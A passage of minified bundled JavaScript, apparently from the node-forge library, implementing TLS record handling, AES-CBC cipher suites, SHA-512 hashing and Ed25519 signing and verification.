De},verifyOptions:U.verifyOptions||{},getCertificate:U.getCertificate||null,getPrivateKey:U.getPrivateKey||null,getSignature:U.getSignature||null,input:r.util.createBuffer(),tlsData:r.util.createBuffer(),data:r.util.createBuffer(),tlsDataReady:U.tlsDataReady,dataReady:U.dataReady,heartbeatReceived:U.heartbeatReceived,closed:U.closed,error:function(Ae,De){De.origin=De.origin||(Ae.entity===a.ConnectionEnd.client?"client":"server"),De.send&&(a.queue(Ae,a.createAlert(Ae,De.alert)),a.flush(Ae));var Le=De.fatal!==!1;Le&&(Ae.fail=!0),U.error(Ae,De),Le&&Ae.close(!1)},deflate:U.deflate||null,inflate:U.inflate||null};ne.reset=function(Ae){ne.version={major:a.Version.major,minor:a.Version.minor},ne.record=null,ne.session=null,ne.peerCertificate=null,ne.state={pending:null,current:null},ne.expect=ne.entity===a.ConnectionEnd.client?c:m,ne.fragmented=null,ne.records=[],ne.open=!1,ne.handshakes=0,ne.handshaking=!1,ne.isConnected=!1,ne.fail=!(Ae||typeof Ae>"u"),ne.input.clear(),ne.tlsData.clear(),ne.data.clear(),ne.state.current=a.createConnectionState(ne)},ne.reset();var Te=function(Ae,De){var Le=De.type-a.ContentType.change_cipher_spec,it=b[Ae.entity][Ae.expect];Le in it?it[Le](Ae,De):a.handleUnexpected(Ae,De)},Re=function(Ae){var De=0,Le=Ae.input,it=Le.length();if(it<5)De=5-it;else{Ae.record={type:Le.getByte(),version:{major:Le.getByte(),minor:Le.getByte()},length:Le.getInt16(),fragment:r.util.createBuffer(),ready:!1};var nt=Ae.record.version.major===Ae.version.major;nt&&Ae.session&&Ae.session.version&&(nt=Ae.record.version.minor===Ae.version.minor),nt||Ae.error(Ae,{message:"Incompatible TLS version.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.protocol_version}})}return De},$e=function(Ae){var De=0,Le=Ae.input,it=Le.length();if(it<Ae.record.length)De=Ae.record.length-it;else{Ae.record.fragment.putBytes(Le.getBytes(Ae.record.length)),Le.compact();var nt=Ae.state.current.read;nt.update(Ae,Ae.record)&&(Ae.fragmented!==null&&(Ae.fragmented.type===Ae.record.type?(Ae.fragmented.fragment.putBuffer(Ae.record.fragment),Ae.record=Ae.fragmented):Ae.error(Ae,{message:"Invalid fragmented record.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.unexpected_message}})),Ae.record.ready=!0)}return De};return ne.handshake=function(Ae){if(ne.entity!==a.ConnectionEnd.client)ne.error(ne,{message:"Cannot initiate handshake as a server.",fatal:!1});else if(ne.handshaking)ne.error(ne,{message:"Handshake already in progress.",fatal:!1});else{ne.fail&&!ne.open&&ne.handshakes===0&&(ne.fail=!1),ne.handshaking=!0,Ae=Ae||"";var De=null;Ae.length>0&&(ne.sessionCache&&(De=ne.sessionCache.getSession(Ae)),De===null&&(Ae="")),Ae.length===0&&ne.sessionCache&&(De=ne.sessionCache.getSession(),De!==null&&(Ae=De.id)),ne.session={id:Ae,version:null,cipherSuite:null,compressionMethod:null,serverCertificate:null,certificateRequest:null,clientCertificate:null,sp:{},md5:r.md.md5.create(),sha1:r.md.sha1.create()},De&&(ne.version=De.version,ne.session.sp=De.sp),ne.session.sp.client_random=a.createRandom().getBytes(),ne.open=!0,a.queue(ne,a.createRecord(ne,{type:a.ContentType.handshake,data:a.createClientHello(ne)})),a.flush(ne)}},ne.process=function(Ae){var De=0;return Ae&&ne.input.putBytes(Ae),ne.fail||(ne.record!==null&&ne.record.ready&&ne.record.fragment.isEmpty()&&(ne.record=null),ne.record===null&&(De=Re(ne)),!ne.fail&&ne.record!==null&&!ne.record.ready&&(De=$e(ne)),!ne.fail&&ne.record!==null&&ne.record.ready&&Te(ne,ne.record)),De},ne.prepare=function(Ae){return a.queue(ne,a.createRecord(ne,{type:a.ContentType.application_data,data:r.util.createBuffer(Ae)})),a.flush(ne)},ne.prepareHeartbeatRequest=function(Ae,De){return Ae instanceof r.util.ByteBuffer&&(Ae=Ae.bytes()),typeof De>"u"&&(De=Ae.length),ne.expectedHeartbeatPayload=Ae,a.queue(ne,a.createRecord(ne,{type:a.ContentType.heartbeat,data:a.createHeartbeat(a.HeartbeatMessageType.heartbeat_request,Ae,De)})),a.flush(ne)},ne.close=function(Ae){if(!ne.fail&&ne.sessionCache&&ne.session){var De={id:ne.session.id,version:ne.session.version,sp:ne.session.sp};De.sp.keys=null,ne.sessionCache.setSession(De.id,De)}ne.open&&(ne.open=!1,ne.input.clear(),(ne.isConnected||ne.handshaking)&&(ne.isConnected=ne.handshaking=!1,a.queue(ne,a.createAlert(ne,{level:a.Alert.Level.warning,description:a.Alert.Description.close_notify})),a.flush(ne)),ne.closed(ne)),ne.reset(Ae)},ne},z_=r.tls=r.tls||{};for(var ae in a)typeof a[ae]!="function"&&(r.tls[ae]=a[ae]);return r.tls.prf_tls1=e,r.tls.hmac_sha1=t,r.tls.createSessionCache=a.createSessionCache,r.tls.createConnection=a.createConnection,z_}var XD;function _pe(){if(XD)return v_.exports;XD=1;var r=Lr();Xg(),CJ();var e=v_.exports=r.tls;e.CipherSuites.TLS_RSA_WITH_AES_128_CBC_SHA={id:[0,47],name:"TLS_RSA_WITH_AES_128_CBC_SHA",initSecurityParameters:function(c){c.bulk_cipher_algorithm=e.BulkCipherAlgorithm.aes,c.cipher_type=e.CipherType.block,c.enc_key_length=16,c.block_length=16,c.fixed_iv_length=16,c.record_iv_length=16,c.mac_algorithm=e.MACAlgorithm.hmac_sha1,c.mac_length=20,c.mac_key_length=20},initConnectionState:t},e.CipherSuites.TLS_RSA_WITH_AES_256_CBC_SHA={id:[0,53],name:"TLS_RSA_WITH_AES_256_CBC_SHA",initSecurityParameters:function(c){c.bulk_cipher_algorithm=e.BulkCipherAlgorithm.aes,c.cipher_type=e.CipherType.block,c.enc_key_length=32,c.block_length=16,c.fixed_iv_length=16,c.record_iv_length=16,c.mac_algorithm=e.MACAlgorithm.hmac_sha1,c.mac_length=20,c.mac_key_length=20},initConnectionState:t};function t(c,l,u){var d=l.entity===r.tls.ConnectionEnd.client;c.read.cipherState={init:!1,cipher:r.cipher.createDecipher("AES-CBC",d?u.keys.server_write_key:u.keys.client_write_key),iv:d?u.keys.server_write_IV:u.keys.client_write_IV},c.write.cipherState={init:!1,cipher:r.cipher.createCipher("AES-CBC",d?u.keys.client_write_key:u.keys.server_write_key),iv:d?u.keys.client_write_IV:u.keys.server_write_IV},c.read.cipherFunction=o,c.write.cipherFunction=i,c.read.macLength=c.write.macLength=u.mac_length,c.read.macFunction=c.write.macFunction=e.hmac_sha1}function i(c,l){var u=!1,d=l.macFunction(l.macKey,l.sequenceNumber,c);c.fragment.putBytes(d),l.updateSequenceNumber();var h;c.version.minor===e.Versions.TLS_1_0.minor?h=l.cipherState.init?null:l.cipherState.iv:h=r.random.getBytesSync(16),l.cipherState.init=!0;var f=l.cipherState.cipher;return f.start({iv:h}),c.version.minor>=e.Versions.TLS_1_1.minor&&f.output.putBytes(h),f.update(c.fragment),f.finish(n)&&(c.fragment=f.output,c.length=c.fragment.length(),u=!0),u}function n(c,l,u){if(!u){var d=c-l.length()%c;l.fillWithByte(d-1,d)}return!0}function s(c,l,u){var d=!0;if(u){for(var h=l.length(),f=l.last(),p=h-1-f;p<h-1;++p)d=d&&l.at(p)==f;d&&l.truncate(f+1)}return d}function o(c,l){var u=!1,d;c.version.minor===e.Versions.TLS_1_0.minor?d=l.cipherState.init?null:l.cipherState.iv:d=c.fragment.getBytes(16),l.cipherState.init=!0;var h=l.cipherState.cipher;h.start({iv:d}),h.update(c.fragment),u=h.finish(s);var f=l.macLength,p=r.random.getBytesSync(f),g=h.output.length();g>=f?(c.fragment=h.output.getBytes(g-f),p=h.output.getBytes(f)):c.fragment=h.output.getBytes(),c.fragment=r.util.createBuffer(c.fragment),c.length=c.fragment.length();var w=l.macFunction(l.macKey,l.sequenceNumber,c);return l.updateSequenceNumber(),u=a(l.macKey,p,w)&&u,u}function a(c,l,u){var d=r.hmac.create();return d.start("SHA1",c),d.update(l),l=d.digest().getBytes(),d.start(null,null),d.update(u),u=d.digest().getBytes(),l===u}return v_.exports}var W_={exports:{}},eL;function EJ(){if(eL)return W_.exports;eL=1;var r=Lr();I0(),Ei();var e=W_.exports=r.sha512=r.sha512||{};r.md.sha512=r.md.algorithms.sha512=e;var t=r.sha384=r.sha512.sha384=r.sha512.sha384||{};t.create=function(){return e.create("SHA-384")},r.md.sha384=r.md.algorithms.sha384=t,r.sha512.sha256=r.sha512.sha256||{create:function(){return e.create("SHA-512/256")}},r.md["sha512/256"]=r.md.algorithms["sha512/256"]=r.sha512.sha256,r.sha512.sha224=r.sha512.sha224||{create:function(){return e.create("SHA-512/224")}},r.md["sha512/224"]=r.md.algorithms["sha512/224"]=r.sha512.sha224,e.create=function(l){if(n||a(),typeof l>"u"&&(l="SHA-512"),!(l in o))throw new Error("Invalid SHA-512 algorithm: "+l);for(var u=o[l],d=null,h=r.util.createBuffer(),f=new Array(80),p=0;p<80;++p)f[p]=new Array(2);var g=64;switch(l){case"SHA-384":g=48;break;case"SHA-512/256":g=32;break;case"SHA-512/224":g=28;break}var w={algorithm:l.replace("-","").toLowerCase(),blockLength:128,digestLength:g,messageLength:0,fullMessageLength:null,messageLengthSize:16};return w.start=function(){w.messageLength=0,w.fullMessageLength=w.messageLength128=[];for(var m=w.messageLengthSize/4,x=0;x<m;++x)w.fullMessageLength.push(0);h=r.util.createBuffer(),d=new Array(u.length);for(var x=0;x<u.length;++x)d[x]=u[x].slice(0);return w},w.start(),w.update=function(m,x){x==="utf8"&&(m=r.util.encodeUtf8(m));var S=m.length;w.messageLength+=S,S=[S/4294967296>>>0,S>>>0];for(var T=w.fullMessageLength.length-1;T>=0;--T)w.fullMessageLength[T]+=S[1],S[1]=S[0]+(w.fullMessageLength[T]/4294967296>>>0),w.fullMessageLength[T]=w.fullMessageLength[T]>>>0,S[0]=S[1]/4294967296>>>0;return h.putBytes(m),c(d,f,h),(h.read>2048||h.length()===0)&&h.compact(),w},w.digest=function(){var m=r.util.createBuffer();m.putBytes(h.bytes());var x=w.fullMessageLength[w.fullMessageLength.length-1]+w.messageLengthSize,S=x&w.blockLength-1;m.putBytes(i.substr(0,w.blockLength-S));for(var T,k,I=w.fullMessageLength[0]*8,E=0;E<w.fullMessageLength.length-1;++E)T=w.fullMessageLength[E+1]*8,k=T/4294967296>>>0,I+=k,m.putInt32(I>>>0),I=T>>>0;m.putInt32(I);for(var C=new Array(d.length),E=0;E<d.length;++E)C[E]=d[E].slice(0);c(C,f,m);var N=r.util.createBuffer(),L;l==="SHA-512"?L=C.length:l==="SHA-384"?L=C.length-2:L=C.length-4;for(var E=0;E<L;++E)N.putInt32(C[E][0]),(E!==L-1||l!=="SHA-512/224")&&N.putInt32(C[E][1]);return N},w};var i=null,n=!1,s=null,o=null;function a(){i="",i+=r.util.fillString("\0",128),s=[[1116352408,3609767458],[1899447441,602891725],[3049323471,3964484399],[3921009573,2173295548],[961987163,4081628472],[1508970993,3053834265],[2453635748,2937671579],[2870763221,3664609560],[3624381080,2734883394],[310598401,1164996542],[607225278,1323610764],[1426881987,3590304994],[1925078388,4068182383],[2162078206,991336113],[2614888103,633803317],[3248222580,3479774868],[3835390401,2666613458],[4022224774,944711139],[264347078,2341262773],[604807628,2007800933],[770255983,1495990901],[1249150122,1856431235],[1555081692,3175218132],[1996064986,2198950837],[2554220882,3999719339],[2821834349,766784016],[2952996808,2566594879],[3210313671,3203337956],[3336571891,1034457026],[3584528711,2466948901],[113926993,3758326383],[338241895,168717936],[666307205,1188179964],[773529912,1546045734],[1294757372,1522805485],[1396182291,2643833823],[1695183700,2343527390],[1986661051,1014477480],[2177026350,1206759142],[2456956037,344077627],[2730485921,1290863460],[2820302411,3158454273],[3259730800,3505952657],[3345764771,106217008],[3516065817,3606008344],[3600352804,1432725776],[4094571909,1467031594],[275423344,851169720],[430227734,3100823752],[506948616,1363258195],[659060556,3750685593],[883997877,3785050280],[958139571,3318307427],[1322822218,3812723403],[1537002063,2003034995],[1747873779,3602036899],[1955562222,1575990012],[2024104815,1125592928],[2227730452,2716904306],[2361852424,442776044],[2428436474,593698344],[2756734187,3733110249],[3204031479,2999351573],[3329325298,3815920427],[3391569614,3928383900],[3515267271,566280711],[3940187606,3454069534],[4118630271,4000239992],[116418474,1914138554],[174292421,2731055270],[289380356,3203993006],[460393269,320620315],[685471733,587496836],[852142971,1086792851],[1017036298,365543100],[1126000580,2618297676],[1288033470,3409855158],[1501505948,4234509866],[1607167915,987167468],[1816402316,1246189591]],o={},o["SHA-512"]=[[1779033703,4089235720],[3144134277,2227873595],[1013904242,4271175723],[2773480762,1595750129],[1359893119,2917565137],[2600822924,725511199],[528734635,4215389547],[1541459225,327033209]],o["SHA-384"]=[[3418070365,3238371032],[1654270250,914150663],[2438529370,812702999],[355462360,4144912697],[1731405415,4290775857],[2394180231,1750603025],[3675008525,1694076839],[1203062813,3204075428]],o["SHA-512/256"]=[[573645204,4230739756],[2673172387,3360449730],[596883563,1867755857],[2520282905,1497426621],[2519219938,2827943907],[3193839141,1401305490],[721525244,746961066],[246885852,2177182882]],o["SHA-512/224"]=[[2352822216,424955298],[1944164710,2312950998],[502970286,855612546],[1738396948,1479516111],[258812777,2077511080],[2011393907,79989058],[1067287976,1780299464],[286451373,2446758561]],n=!0}function c(l,u,d){for(var h,f,p,g,w,m,x,S,T,k,I,E,C,N,L,$,y,A,b,v,_,O,D,R,P,B,M,W,K,q,J,le,ae,U,G,Z=d.length();Z>=128;){for(K=0;K<16;++K)u[K][0]=d.getInt32()>>>0,u[K][1]=d.getInt32()>>>0;for(;K<80;++K)le=u[K-2],q=le[0],J=le[1],h=((q>>>19|J<<13)^(J>>>29|q<<3)^q>>>6)>>>0,f=((q<<13|J>>>19)^(J<<3|q>>>29)^(q<<26|J>>>6))>>>0,U=u[K-15],q=U[0],J=U[1],p=((q>>>1|J<<31)^(q>>>8|J<<24)^q>>>7)>>>0,g=((q<<31|J>>>1)^(q<<24|J>>>8)^(q<<25|J>>>7))>>>0,ae=u[K-7],G=u[K-16],J=f+ae[1]+g+G[1],u[K][0]=h+ae[0]+p+G[0]+(J/4294967296>>>0)>>>0,u[K][1]=J>>>0;for(C=l[0][0],N=l[0][1],L=l[1][0],$=l[1][1],y=l[2][0],A=l[2][1],b=l[3][0],v=l[3][1],_=l[4][0],O=l[4][1],D=l[5][0],R=l[5][1],P=l[6][0],B=l[6][1],M=l[7][0],W=l[7][1],K=0;K<80;++K)x=((_>>>14|O<<18)^(_>>>18|O<<14)^(O>>>9|_<<23))>>>0,S=((_<<18|O>>>14)^(_<<14|O>>>18)^(O<<23|_>>>9))>>>0,T=(P^_&(D^P))>>>0,k=(B^O&(R^B))>>>0,w=((C>>>28|N<<4)^(N>>>2|C<<30)^(N>>>7|C<<25))>>>0,m=((C<<4|N>>>28)^(N<<30|C>>>2)^(N<<25|C>>>7))>>>0,I=(C&L|y&(C^L))>>>0,E=(N&$|A&(N^$))>>>0,J=W+S+k+s[K][1]+u[K][1],h=M+x+T+s[K][0]+u[K][0]+(J/4294967296>>>0)>>>0,f=J>>>0,J=m+E,p=w+I+(J/4294967296>>>0)>>>0,g=J>>>0,M=P,W=B,P=D,B=R,D=_,R=O,J=v+f,_=b+h+(J/4294967296>>>0)>>>0,O=J>>>0,b=y,v=A,y=L,A=$,L=C,$=N,J=f+g,C=h+p+(J/4294967296>>>0)>>>0,N=J>>>0;J=l[0][1]+N,l[0][0]=l[0][0]+C+(J/4294967296>>>0)>>>0,l[0][1]=J>>>0,J=l[1][1]+$,l[1][0]=l[1][0]+L+(J/4294967296>>>0)>>>0,l[1][1]=J>>>0,J=l[2][1]+A,l[2][0]=l[2][0]+y+(J/4294967296>>>0)>>>0,l[2][1]=J>>>0,J=l[3][1]+v,l[3][0]=l[3][0]+b+(J/4294967296>>>0)>>>0,l[3][1]=J>>>0,J=l[4][1]+O,l[4][0]=l[4][0]+_+(J/4294967296>>>0)>>>0,l[4][1]=J>>>0,J=l[5][1]+R,l[5][0]=l[5][0]+D+(J/4294967296>>>0)>>>0,l[5][1]=J>>>0,J=l[6][1]+B,l[6][0]=l[6][0]+P+(J/4294967296>>>0)>>>0,l[6][1]=J>>>0,J=l[7][1]+W,l[7][0]=l[7][0]+M+(J/4294967296>>>0)>>>0,l[7][1]=J>>>0,Z-=128}}return W_.exports}var U6={},tL;function Spe(){if(tL)return U6;tL=1;var r=Lr();Yd();var e=r.asn1;return U6.privateKeyValidator={name:"PrivateKeyInfo",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"PrivateKeyInfo.version",tagClass:e.Class.UNIVERSAL,type:e.Type.INTEGER,constructed:!1,capture:"privateKeyVersion"},{name:"PrivateKeyInfo.privateKeyAlgorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"AlgorithmIdentifier.algorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1,capture:"privateKeyOid"}]},{name:"PrivateKeyInfo",tagClass:e.Class.UNIVERSAL,type:e.Type.OCTETSTRING,constructed:!1,capture:"privateKey"}]},U6.publicKeyValidator={name:"SubjectPublicKeyInfo",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,captureAsn1:"subjectPublicKeyInfo",value:[{name:"SubjectPublicKeyInfo.AlgorithmIdentifier",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"AlgorithmIdentifier.algorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1,capture:"publicKeyOid"}]},{tagClass:e.Class.UNIVERSAL,type:e.Type.BITSTRING,constructed:!1,composed:!0,captureBitStringValue:"ed25519PublicKey"}]},U6}var H_,rL;function Ape(){if(rL)return H_;rL=1;var r=Lr();Yx(),Au(),EJ(),Ei();var e=Spe(),t=e.publicKeyValidator,i=e.privateKeyValidator;if(typeof n>"u")var n=r.jsbn.BigInteger;var s=r.util.ByteBuffer,o=typeof Buffer>"u"?Uint8Array:Buffer;r.pki=r.pki||{},H_=r.pki.ed25519=r.ed25519=r.ed25519||{};var a=r.ed25519;a.constants={},a.constants.PUBLIC_KEY_BYTE_LENGTH=32,a.constants.PRIVATE_KEY_BYTE_LENGTH=64,a.constants.SEED_BYTE_LENGTH=32,a.constants.SIGN_BYTE_LENGTH=64,a.constants.HASH_BYTE_LENGTH=64,a.generateKeyPair=function(U){U=U||{};var G=U.seed;if(G===void 0)G=r.random.getBytesSync(a.constants.SEED_BYTE_LENGTH);else if(typeof G=="string"){if(G.length!==a.constants.SEED_BYTE_LENGTH)throw new TypeError('"seed" must be '+a.constants.SEED_BYTE_LENGTH+" bytes in length.")}else if(!(G instanceof Uint8Array))throw new TypeError('"seed" must be a node.js Buffer, Uint8Array, or a binary string.');G=c({message:G,encoding:"binary"});for(var Z=new o(a.constants.PUBLIC_KEY_BYTE_LENGTH),j=new o(a.constants.PRIVATE_KEY_BYTE_LENGTH),Y=0;Y<32;++Y)j[Y]=G[Y];return x(Z,j),{publicKey:Z,privateKey:j}},a.privateKeyFromAsn1=function(U){var G={},Z=[],j=r.asn1.validate(U,i,G,Z);if(!j){var Y=new Error("Invalid Key.");throw Y.errors=Z,Y}var se=r.asn1.derToOid(G.privateKeyOid),ne=r.oids.EdDSA25519;if(se!==ne)throw new Error('Invalid OID "'+se+'"; OID must be "'+ne+'".');var Te=G.privateKey,Re=c({message:r.asn1.fromDer(Te).value,encoding:"binary"});return{privateKeyBytes:Re}},a.publicKeyFromAsn1=function(U){var G={},Z=[],j=r.asn1.validate(U,t,G,Z);if(!j){var Y=new Error("Invalid Key.");throw Y.errors=Z,Y}var se=r.asn1.derToOid(G.publicKeyOid),ne=r.oids.EdDSA25519;if(se!==ne)throw new Error('Invalid OID "'+se+'"; OID must be "'+ne+'".');var Te=G.ed25519PublicKey;if(Te.length!==a.constants.PUBLIC_KEY_BYTE_LENGTH)throw new Error("Key length is invalid.");return c({message:Te,encoding:"binary"})},a.publicKeyFromPrivateKey=function(U){U=U||{};var G=c({message:U.privateKey,encoding:"binary"});if(G.length!==a.constants.PRIVATE_KEY_BYTE_LENGTH)throw new TypeError('"options.privateKey" must have a byte length of '+a.constants.PRIVATE_KEY_BYTE_LENGTH);for(var Z=new o(a.constants.PUBLIC_KEY_BYTE_LENGTH),j=0;j<Z.length;++j)Z[j]=G[32+j];return Z},a.sign=function(U){U=U||{};var G=c(U),Z=c({message:U.privateKey,encoding:"binary"});if(Z.length===a.constants.SEED_BYTE_LENGTH){var j=a.generateKeyPair({seed:Z});Z=j.privateKey}else if(Z.length!==a.constants.PRIVATE_KEY_BYTE_LENGTH)throw new TypeError('"options.privateKey" must have a byte length of '+a.constants.SEED_BYTE_LENGTH+" or "+a.constants.PRIVATE_KEY_BYTE_LENGTH);var Y=new o(a.constants.SIGN_BYTE_LENGTH+G.length);S(Y,G,G.length,Z);for(var se=new o(a.constants.SIGN_BYTE_LENGTH),ne=0;ne<se.length;++ne)se[ne]=Y[ne];return se},a.verify=function(U){U=U||{};var G=c(U);if(U.signature===void 0)throw new TypeError('"options.signature" must be a node.js Buffer, a Uint8Array, a forge ByteBuffer, or a binary string.');var Z=c({message:U.signature,encoding:"binary"});if(Z.length!==a.constants.SIGN_BYTE_LENGTH)throw new TypeError('"options.signature" must have a byte length of '+a.constants.SIGN_BYTE_LENGTH);var j=c({message:U.publicKey,encoding:"binary"});if(j.length!==a.constants.PUBLIC_KEY_BYTE_LENGTH)throw new TypeError('"options.publicKey" must have a byte length of '+a.constants.PUBLIC_KEY_BYTE_LENGTH);var Y=new o(a.constants.SIGN_BYTE_LENGTH+G.length),se=new o(a.constants.SIGN_BYTE_LENGTH+G.length),ne;for(ne=0;ne<a.constants.SIGN_BYTE_LENGTH;++ne)Y[ne]=Z[ne];for(ne=0;ne<G.length;++ne)Y[ne+a.constants.SIGN_BYTE_LENGTH]=G[ne];return T(se,Y,Y.length,j)>=0};function c(U){var G=U.message;if(G instanceof Uint8Array||G instanceof o)return G;var Z=U.encoding;if(G===void 0)if(U.md)G=U.md.digest().getBytes(),Z="binary";else throw new TypeError('"options.message" or "options.md" not specified.');if(typeof G=="string"&&!Z)throw new TypeError('"options.encoding" must be "binary" or "utf8".');if(typeof G=="string"){if(typeof Buffer<"u")return Buffer.from(G,Z);G=new s(G,Z)}else if(!(G instanceof s))throw new TypeError('"options.message" must be a node.js Buffer, a Uint8Array, a forge ByteBuffer, or a string with "options.encoding" specifying its encoding.');for(var j=new o(G.length()),Y=0;Y<j.length;++Y)j[Y]=G.at(Y);return j}var l=K(),u=K([1]),d=K([30883,4953,19914,30187,55467,16705,2637,112,59544,30585,16505,36039,65139,11119,27886,20995]),h=K([61785,9906,39828,60374,45398,33411,5274,224,53552,61171,33010,6542,64743,22239,55772,9222]),f=K([54554,36645,11616,51542,42930,38181,51040,26924,56412,64982,57905,49316,21502,52590,14035,8553]),p=K([26200,26214,26214,26214,26214,26214,26214,26214,26214,26214,26214,26214,26214,26214,26214,26214]),g=new Float64Array([237,211,245,92,26,99,18,88,214,156,247,162,222,249,222,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16]),w=K([41136,18958,6951,50414,58488,44335,6150,12099,55207,15867,153,11085,57099,20417,9344,11139]);function m(U,G){var Z=r.md.sha512.create(),j=new s(U);Z.update(j.getBytes(G),"binary");var Y=Z.digest().getBytes();if(typeof Buffer<"u")return Buffer.from(Y,"binary");for(var se=new o(a.constants.HASH_BYTE_LENGTH),ne=0;ne<64;++ne)se[ne]=Y.charCodeAt(ne);return se}function x(U,G){var Z=[K(),K(),K(),K()],j,Y=m(G,32);for(Y[0]&=248,Y[31]&=127,Y[31]|=64,R(Z,Y),N(U,Z),j=0;j<32;++j)G[j+32]=U[j];return 0}function S(U,G,Z,j){var Y,se,ne=new Float64Array(64),Te=[K(),K(),K(),K()],Re=m(j,32);Re[0]&=248,Re[31]&=127,Re[31]|=64;var $e=Z+64;for(Y=0;Y<Z;++Y)U[64+Y]=G[Y];for(Y=0;Y<32;++Y)U[32+Y]=Re[32+Y];var Ae=m(U.subarray(32),Z+32);for(I(Ae),R(Te,Ae),N(U,Te),Y=32;Y<64;++Y)U[Y]=j[Y];var De=m(U,Z+64);for(I(De),Y=32;Y<64;++Y)ne[Y]=0;for(Y=0;Y<32;++Y)ne[Y]=Ae[Y];for(Y=0;Y<32;++Y)for(se=0;se<32;se++)ne[Y+se]+=De[Y]*Re[se];return k(U.subarray(32),ne),$e}function T(U,G,Z,j){var Y,se,ne=new o(32),Te=[K(),K(),K(),K()],Re=[K(),K(),K(),K()];if(se=-1,Z<64||$(Re,j))return-1;for(Y=0;Y<Z;++Y)U[Y]=G[Y];for(Y=0;Y<32;++Y)U[Y+32]=j[Y];var $e=m(U,Z);if(I($e),D(Te,Re,$e),R(Re,G.subarray(32)),E(Te,Re),N(ne,Te),Z-=64,v(G,0,ne,0)){for(Y=0;Y<Z;++Y)U[Y]=0;return-1}for(Y=0;Y<Z;++Y)U[Y]=G[Y+64];return se=Z,se}function k(U,G){var Z,j,Y,se;for(j=63;j>=32;--j){for(Z=0,Y=j-32,se=j-12;Y<se;++Y)G[Y]+=Z-16*G[j]*g[Y-(j-32)],Z=G[Y]+128>>8,G[Y]-=Z*256;G[Y]+=Z,G[j]=0}for(Z=0,Y=0;Y<32;++Y)G[Y]+=Z-(G[31]>>4)*g[Y],Z=G[Y]>>8,G[Y]&=255;for(Y=0;Y<32;++Y)G[Y]-=Z*g[Y];for(j=0;j<32;++j)G[j+1]+=G[j]>>8,U[j]=G[j]&255}function I(U){for(var G=new Float64Array(64),Z=0;Z<64;++Z)G[Z]=U[Z],U[Z]=0;k(U,G)}function E(U,G){var Z=K(),j=K(),Y=K(),se=K(),ne=K(),Te=K(),Re=K(),$e=K(),Ae=K();J(Z,U[1],U[0]),J(Ae,G[1],G[0]),ae(Z,Z,Ae),q(j,U[0],U[1]),q(Ae,G[0],G[1]),ae(j,j,Ae),ae(Y,U[3],G[3]),ae(Y,Y,h),ae(se,U[2],G[2]),q(se,se,se),J(ne,j,Z),J(Te,se,Y),q(Re,se,Y),q($e,j,Z),ae(U[0],ne,Te),ae(U[1],$e,Re),ae(U[2],Re,Te),ae(U[3],ne,$e)}function C(U,G,Z){for(var j=0;j<4;++j)W(U[j],G[j],Z)}function N(U,G){var Z=K(),j=K(),Y=K();B(Y,G[2]),ae(Z,G[0],Y),ae(j,G[1],Y),L(U,j),U[31]^=O(Z)<<7}function L(U,G){var Z,j,Y,se=K(),ne=K();for(Z=0;Z<16;++Z)ne[Z]=G[Z];for(M(ne),M(ne),M(ne),j=0;j<2;++j){for(se[0]=ne[0]-65517,Z=1;Z<15;++Z)se[Z]=ne[Z]-65535-(se[Z-1]>>16&1),se[Z-1]&=65535;se[15]=ne[15]-32767-(se[14]>>16&1),Y=se[15]>>16&1,se[14]&=65535,W(ne,se,1-Y)}for(Z=0;Z<16;Z++)U[2*Z]=ne[Z]&255,U[2*Z+1]=ne[Z]>>8}function $(U,G){var Z=K(),j=K(),Y=K(),se=K(),ne=K(),Te=K(),Re=K();return P(U[2],u),y(U[1],G),le(Y,U[1]),ae(se,Y,d),J(Y,Y,U[2]),q(se,U[2],se),le(ne,se),le(Te,ne),ae(Re,Te,ne),ae(Z,Re,Y),ae(Z,Z,se),A(Z,Z),ae(Z,Z,Y),ae(Z,Z,se),ae(Z,Z,se),ae(U[0],Z,se),le(j,U[0]),ae(j,j,se),b(j,Y)&&ae(U[0],U[0],w),le(j,U[0]),ae(j,j,se),b(j,Y)?-1:(O(U[0])===G[31]>>7&&J(U[0],l,U[0]),ae(U[3],U[0],U[1]),0)}function y(U,G){var Z;for(Z=0;Z<16;++Z)U[Z]=G[2*Z]+(G[2*Z+1]<<8);U[15]&=32767}function A(U,G){var Z=K(),j;for(j=0;j<16;++j)Z[j]=G[j];for(j=250;j>=0;--j)le(Z,Z),j!==1&&ae(Z,Z,G);for(j=0;j<16;++j)U[j]=Z[j]}function b(U,G){var Z=new o(32),j=new o(32);return L(Z,U),L(j,G),v(Z,0,j,0)}function v(U,G,Z,j){return _(U,G,Z,j,32)}function _(U,G,Z,j,Y){var se,ne=0;for(se=0;se<Y;++se)ne|=U[G+se]^Z[j+se];return(1&ne-1>>>8)-1}function O(U){var G=new o(32);return L(G,U),G[0]&1}function D(U,G,Z){var j,Y;for(P(U[0],l),P(U[1],u),P(U[2],u),P(U[3],l),Y=255;Y>=0;--Y)j=Z[Y/8|0]>>(Y&7)&1,C(U,G,j),E(G,U),E(U,U),C(U,G,j)}function R(U,G){var Z=[K(),K(),K(),K()];P(Z[0],f),P(Z[1],p),P(Z[2],u),ae(Z[3],f,p),D(U,Z,G)}function P(U,G){var Z;for(Z=0;Z<16;Z++)U[Z]=G[Z]|0}function B(U,G){var Z=K(),j;for(j=0;j<16;++j)Z[j]=G[j];for(j=253;j>=0;--j)le(Z,Z),j!==2&&j!==4&&ae(Z,Z,G);for(j=0;j<16;++j)U[j]=Z[j]}function M(U){var G,Z,j=1;for(G=0;G<16;++G)Z=U[G]+j+65535,j=Math.floor(Z/65536),U[G]=Z-j*65536;U[0]+=j-1+37*(j-1)}function W(U,G,Z){for(var j,Y=~(Z-1),se=0;se<16;++se)j=Y&(U[se]^G[se]),U[se]^=j,G[se]^=j}function K(U){var G,Z=new Float64Array(16);if(U)for(G=0;G<U.length;++G)Z[G]=U[G];return Z}function q(U,G,Z){for(var j=0;j<16;++j)U[j]=G[j]+Z[j]}function J(U,G,Z){for(var j=0;j<16;++j)U[j]=G[j]-Z[j]}function 